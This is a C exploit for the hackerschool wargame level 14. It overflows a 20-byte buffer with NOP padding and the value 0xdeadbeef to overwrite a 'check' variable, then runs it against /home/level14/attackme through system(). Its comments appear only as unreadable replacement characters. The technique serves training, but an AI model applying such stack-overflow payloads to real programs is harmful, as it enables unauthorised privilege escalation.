/*
 * Author : superdk@hanmail.net
 * DATA : exploit about hackerschool level14
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>

#define NOP 0x90
#define BUFSIZE 44   /* NOP(40) + check(0xdeadbeef) */

// "int check" ������ �Է��� ��
char writecode[] = "\xef\xbe\xad\xde";

int main()
{
    char shellBuf[BUFSIZE], cmdBuf[320];
    int i, j, shellLen;
    
    shellLen = strlen(writecode);

	// "char buf[20]" �� 40 ����Ʈ�� NOP ��� �Ҵ�
    for(i=0; i<sizeof(shellBuf)-shellLen; i++)
        shellBuf[i] = NOP;
   
	// "int check" ������ ���� �� �Է�
    for(j=0; j<shellLen; j++)
        shellBuf[i++] = writecode[j];
    
    // ���� ��ɾ� ����
    sprintf(cmdBuf, "(perl -e \'print \"");
    strcat(cmdBuf, shellBuf);
    strcat(cmdBuf, "\"\'; cat) | /home/level14/attackme");
    strcat(cmdBuf, "\x0a");
    system(cmdBuf);
}
